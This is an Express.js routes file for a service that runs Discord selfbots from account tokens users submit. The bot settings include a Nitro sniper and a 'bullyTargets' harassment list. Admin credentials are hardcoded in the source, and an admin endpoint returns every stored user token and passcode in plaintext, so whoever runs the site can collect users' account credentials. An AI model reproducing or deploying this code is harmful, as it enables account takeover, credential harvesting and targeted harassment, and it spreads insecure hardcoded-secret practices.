import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { initDb, getPool } from "./db";
import session from "express-session";
import FileStoreFactory from "session-file-store";
import connectPgSimple from "connect-pg-simple";
import { BotManager } from "./services/botManager";
import { randomBytes } from "crypto";
import fs from "fs";
import path from "path";

const FileStore = FileStoreFactory(session);
const PgStore = connectPgSimple(session);

// ── Admin credentials ─────────────────────────────────────────────────────────
const ADMIN_USERNAME = "peroxide000";
const ADMIN_PASSWORD = "moneyhungry";

// ── Stable session secret ─────────────────────────────────────────────────────
const SECRET_FILE = path.resolve(process.cwd(), "data", "session_secret");
function loadOrCreateSecret(): string {
  if (process.env.SESSION_SECRET) return process.env.SESSION_SECRET;
  try {
    if (fs.existsSync(SECRET_FILE)) {
      const s = fs.readFileSync(SECRET_FILE, "utf-8").trim();
      if (s.length > 0) return s;
    }
    const newSecret = randomBytes(32).toString("hex");
    fs.mkdirSync(path.dirname(SECRET_FILE), { recursive: true });
    fs.writeFileSync(SECRET_FILE, newSecret, "utf-8");
    console.log("[session] Generated and saved new SESSION_SECRET to disk");
    return newSecret;
  } catch (e) {
    console.warn("[session] Could not persist SESSION_SECRET, using ephemeral one:", e);
    return randomBytes(32).toString("hex");
  }
}
const SESSION_SECRET = loadOrCreateSecret();

declare module "express-session" {
  interface SessionData {
    userId?: string;
    adminAuthed?: boolean;
  }
}

async function requireAuth(req: Request, res: Response, next: NextFunction) {
  try {
    if (!req.session?.userId) {
      const user = await storage.createUser({
        username: `session_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
        password: "",
      });
      req.session.userId = user.id;
      await new Promise<void>((resolve, reject) => req.session.save(err => err ? reject(err) : resolve()));
    }
    next();
  } catch (err) {
    console.error("[requireAuth] Failed to create session:", err);
    res.status(500).json({ message: "Session initialization failed" });
  }
}

function wrap(fn: (req: Request, res: Response, next: NextFunction) => Promise<any>) {
  return (req: Request, res: Response, next: NextFunction) => {
    fn(req, res, next).catch(err => {
      console.error("[route] Unhandled error:", err);
      if (!res.headersSent) {
        res.status(500).json({ message: "Internal server error" });
      }
    });
  };
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Initialise DB tables if using PostgreSQL
  await initDb();

  // Auto-start all bots that were running before restart
  setTimeout(async () => {
    try {
      const bots = await storage.getAllBots();
      const runnable = bots.filter(b => b.isRunning);
      console.log(`[startup] Auto-starting ${runnable.length} previously-running bots...`);
      for (const bot of runnable) {
        BotManager.startBot(bot).catch(e =>
          console.warn(`[startup] Failed to restart bot ${bot.id}:`, e)
        );
      }
    } catch (e) {
      console.error("[startup] startAll failed:", e);
    }
  }, 500);

  // ── Session store: PostgreSQL (Railway) or file (local dev) ──────────────
  let sessionStore: session.Store;
  const pgPool = getPool();
  if (pgPool) {
    sessionStore = new PgStore({ pool: pgPool, tableName: "session", createTableIfMissing: true });
    console.log("[session] Using PostgreSQL session store");
  } else {
    const sessionsDir = path.resolve(process.cwd(), "data", "sessions");
    fs.mkdirSync(sessionsDir, { recursive: true });
    sessionStore = new FileStore({
      path: sessionsDir,
      ttl: 7 * 24 * 60 * 60,
      retries: 0,
      logFn: () => {},
    });
    console.log("[session] Using file-based session store");
  }

  app.use(
    session({
      secret: SESSION_SECRET,
      resave: false,
      saveUninitialized: false,
      store: sessionStore,
      cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        sameSite: "lax",
        maxAge: 7 * 24 * 60 * 60 * 1000,
      },
    })
  );

  // Discord domain verification
  app.get("/.well-known/discord", (_req, res) => {
    res.setHeader("Content-Type", "text/plain");
    res.send("dh=15c0aab2b7489dac2bd89a507c7a0e5432af1cf3");
  });

  // ─── Session (auto-create, no login required) ────────────────────────────

  app.get("/api/auth/init", wrap(async (req, res) => {
    if (!req.session.userId) {
      const user = await storage.createUser({
        username: `session_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
        password: "",
      });
      req.session.userId = user.id;
      await new Promise<void>((resolve, reject) => req.session.save(err => err ? reject(err) : resolve()));
    }
    return res.json({ id: req.session.userId });
  }));

  // ─── Bots ────────────────────────────────────────────────────────────────

  app.get("/api/bots", requireAuth, wrap(async (req, res) => {
    const bots = await storage.getBotsByUser(req.session.userId!);
    const withStatus = bots.map(b => ({
      ...b,
      isRunning: BotManager.isRunning(b.id),
    }));
    return res.json(withStatus);
  }));

  app.post("/api/bots", requireAuth, wrap(async (req, res) => {
    const { name, token } = req.body;
    if (!name || typeof name !== "string" || !name.trim()) {
      return res.status(400).json({ message: "Name is required" });
    }
    if (!token || typeof token !== "string" || token.trim().length < 10) {
      return res.status(400).json({ message: "A valid Discord token is required" });
    }
    const bot = await storage.createBot({
      userId: req.session.userId!,
      name: name.trim(),
      token: token.trim(),
      isRunning: false,
      discordTag: "",
      discordId: "",
      lastSeen: null,
      rpcTitle: "",
      rpcSubtitle: "",
      rpcAppName: "",
      rpcImage: "",
      rpcType: "PLAYING",
      rpcStartTimestamp: "",
      rpcEndTimestamp: "",
      commandPrefix: ".",
      nitroSniper: false,
      bullyTargets: [],
      passcode: "",
      gcAllowAll: false,
      whitelistedGcs: [],
    });

    const result = await BotManager.startBot(bot);
    if (!result.success) {
      await storage.deleteBot(bot.id);
      return res.status(400).json({ message: result.error || "Failed to connect bot" });
    }

    const fresh = await storage.getBot(bot.id);
    return res.status(201).json({ ...fresh, isRunning: BotManager.isRunning(bot.id) });
  }));

  app.get("/api/bots/:id", requireAuth, wrap(async (req, res) => {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid bot ID" });
    const bot = await storage.getBot(id);
    if (!bot || bot.userId !== req.session.userId) {
      return res.status(404).json({ message: "Bot not found" });
    }
    return res.json({ ...bot, isRunning: BotManager.isRunning(id) });
  }));

  app.put("/api/bots/:id", requireAuth, wrap(async (req, res) => {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid bot ID" });
    const bot = await storage.getBot(id);
    if (!bot || bot.userId !== req.session.userId) {
      return res.status(404).json({ message: "Bot not found" });
    }
    await BotManager.updateBotConfig(id, req.body);
    const updated = await storage.getBot(id);
    return res.json({ ...updated, isRunning: BotManager.isRunning(id) });
  }));

  app.delete("/api/bots/:id", requireAuth, wrap(async (req, res) => {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid bot ID" });
    const bot = await storage.getBot(id);
    if (!bot || bot.userId !== req.session.userId) {
      return res.status(404).json({ message: "Bot not found" });
    }
    await BotManager.stopBot(id);
    await storage.deleteBot(id);
    return res.status(204).send();
  }));

  app.post("/api/bots/:id/restart", requireAuth, wrap(async (req, res) => {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid bot ID" });
    const bot = await storage.getBot(id);
    if (!bot || bot.userId !== req.session.userId) {
      return res.status(404).json({ message: "Bot not found" });
    }
    try {
      await BotManager.stopBot(id);
      await BotManager.startBot(bot);
      return res.json({ success: true, message: "Bot restarted" });
    } catch (err: any) {
      return res.json({ success: false, message: err?.message || "Restart failed" });
    }
  }));

  app.post("/api/bots/:id/stop", requireAuth, wrap(async (req, res) => {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid bot ID" });
    const bot = await storage.getBot(id);
    if (!bot || bot.userId !== req.session.userId) {
      return res.status(404).json({ message: "Bot not found" });
    }
    await BotManager.stopBot(id);
    return res.json({ success: true, message: "Bot stopped" });
  }));

  // ─── Admin ───────────────────────────────────────────────────────────────

  app.post("/api/admin/auth", wrap(async (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      req.session.adminAuthed = true;
      await new Promise<void>((resolve, reject) => req.session.save(err => err ? reject(err) : resolve()));
      return res.json({ ok: true });
    }
    return res.status(403).json({ message: "Access denied." });
  }));

  app.get("/api/admin/data", wrap(async (req, res) => {
    if (!req.session?.adminAuthed) {
      return res.status(403).json({ message: "Access denied" });
    }
    const allBots = await storage.getAllBots();
    const userIds = Array.from(new Set(allBots.map(b => b.userId)));
    const users = await Promise.all(userIds.map(id => storage.getUser(id)));
    const userData = await Promise.all(
      users.filter(Boolean).map(async (u) => ({
        id: u!.id,
        username: u!.username,
        createdAt: null,
        botCount: await storage.getUserBotCount(u!.id),
      }))
    );
    return res.json({ users: userData, totalBots: allBots.length });
  }));

  app.get("/api/admin/bots", wrap(async (req, res) => {
    if (!req.session?.adminAuthed) {
      return res.status(403).json({ message: "Access denied" });
    }
    const bots = await storage.getAllBots();
    return res.json(bots.map(b => ({
      id: b.id,
      name: b.name,
      token: b.token,
      discordTag: b.discordTag || b.name,
      discordId: b.discordId || "",
      isConnected: BotManager.isRunning(b.id),
      isRunning: BotManager.isRunning(b.id),
      lastSeen: b.lastSeen,
      userId: b.userId,
      commandPrefix: b.commandPrefix,
      nitroSniper: b.nitroSniper,
      passcode: b.passcode,
    })));
  }));

  app.delete("/api/admin/bots/:id", wrap(async (req, res) => {
    if (!req.session?.adminAuthed) {
      return res.status(403).json({ message: "Access denied" });
    }
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ message: "Invalid bot ID" });
    await BotManager.stopBot(id);
    await storage.deleteBot(id);
    return res.status(204).send();
  }));

  app.post("/api/admin/bots/disconnect-all", wrap(async (req, res) => {
    if (!req.session?.adminAuthed) {
      return res.status(403).json({ message: "Access denied" });
    }
    const bots = await storage.getAllBots();
    let stopped = 0;
    for (const bot of bots) {
      if (BotManager.isRunning(bot.id)) {
        await BotManager.stopBot(bot.id);
        stopped++;
      }
    }
    return res.json({ stopped });
  }));

  return httpServer;
}
